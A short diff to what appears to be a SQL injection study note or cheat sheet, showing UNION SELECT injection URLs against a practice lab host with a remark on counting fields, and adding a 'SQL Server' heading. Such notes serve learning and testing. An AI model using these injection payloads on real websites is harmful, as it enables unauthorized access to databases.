@@ -77,3 +77,7 @@ http://ptl-544ad5ad-8438986c.libcurl.so/cat.php?id=1 or 1=1 UNION SELECT 1,2
 http://ptl-544ad5ad-8438986c.libcurl.so/cat.php?id=1 or 1=1 UNION SELECT 1,2,3,4
 ````
 Identify number of fields in select: here 1,2,3,4 doesn’t generate error
+
+
+
+##  SQL Server 
